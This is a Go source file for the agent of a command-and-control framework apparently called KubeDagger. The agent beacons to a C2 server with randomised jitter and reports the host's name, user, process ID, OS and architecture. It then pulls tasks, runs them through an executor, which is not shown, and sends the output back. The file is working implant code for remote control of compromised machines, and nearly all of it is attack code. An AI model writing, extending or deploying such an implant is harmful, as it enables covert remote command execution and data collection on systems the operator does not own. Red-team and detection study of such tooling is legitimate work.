package agent

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"math/big"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

type Config struct {
	ServerURL     string
	AgentID       string
	BeaconJitter  float64
	MaxRetries    int
	RetryInterval time.Duration
}

type Agent struct {
	cfg       Config
	transport *Transport
	executor  *Executor
	stop      chan struct{}
}

func New(cfg Config, transport *Transport) *Agent {
	if cfg.AgentID == "" {
		cfg.AgentID = generateAgentID()
	}
	if cfg.BeaconJitter == 0 {
		cfg.BeaconJitter = 0.2
	}
	if cfg.MaxRetries == 0 {
		cfg.MaxRetries = 5
	}
	if cfg.RetryInterval == 0 {
		cfg.RetryInterval = 10 * time.Second
	}

	return &Agent{
		cfg:       cfg,
		transport: transport,
		executor:  NewExecutor(),
		stop:      make(chan struct{}),
	}
}

func (a *Agent) Run(ctx context.Context) error {
	logrus.Infof("agent %s starting (server: %s)", a.cfg.AgentID, a.cfg.ServerURL)

	failures := 0
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-a.stop:
			return nil
		default:
		}

		sleepSec, err := a.checkin()
		if err != nil {
			failures++
			logrus.Warnf("checkin failed (%d/%d): %v", failures, a.cfg.MaxRetries, err)
			if failures >= a.cfg.MaxRetries {
				logrus.Error("max retries reached, backing off")
				a.sleep(ctx, a.cfg.RetryInterval*time.Duration(failures))
			} else {
				a.sleep(ctx, a.cfg.RetryInterval)
			}
			continue
		}
		failures = 0

		a.processTasks(ctx)
		a.sleep(ctx, a.jitteredSleep(time.Duration(sleepSec)*time.Second))
	}
}

func (a *Agent) Stop() {
	close(a.stop)
}

func (a *Agent) checkin() (int, error) {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	req := c2server.CheckinRequest{
		AgentID:  a.cfg.AgentID,
		Hostname: hostname,
		OS:       c2server.AgentOS(runtime.GOOS),
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		User:     username,
	}

	resp, err := a.transport.Checkin(req)
	if err != nil {
		return 30, err
	}
	return resp.SleepInterval, nil
}

func (a *Agent) processTasks(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		task, err := a.transport.GetTask(a.cfg.AgentID)
		if err != nil {
			logrus.Warnf("get task failed: %v", err)
			return
		}
		if task == nil {
			return
		}

		logrus.Infof("executing task %s (type: %s)", task.TaskID, task.Type)

		if task.Type == c2server.TaskExit {
			a.sendResult(task.TaskID, "exiting", "")
			a.Stop()
			return
		}

		output, execErr := a.executor.Execute(ctx, task)

		errStr := ""
		if execErr != nil {
			errStr = execErr.Error()
		}
		a.sendResult(task.TaskID, output, errStr)
	}
}

func (a *Agent) sendResult(taskID, output, errStr string) {
	status := c2server.StatusCompleted
	if errStr != "" {
		status = c2server.StatusFailed
	}

	result := c2server.ResultRequest{
		AgentID: a.cfg.AgentID,
		TaskID:  taskID,
		Status:  status,
		Output:  output,
		Error:   errStr,
	}

	if err := a.transport.SendResult(result); err != nil {
		logrus.Warnf("send result failed for task %s: %v", taskID, err)
	}
}

func (a *Agent) jitteredSleep(base time.Duration) time.Duration {
	jitter := float64(base) * a.cfg.BeaconJitter
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(jitter*2)))
	offset := time.Duration(n.Int64()) - time.Duration(jitter)
	return base + offset
}

func (a *Agent) sleep(ctx context.Context, d time.Duration) {
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-ctx.Done():
	case <-a.stop:
	case <-timer.C:
	}
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}
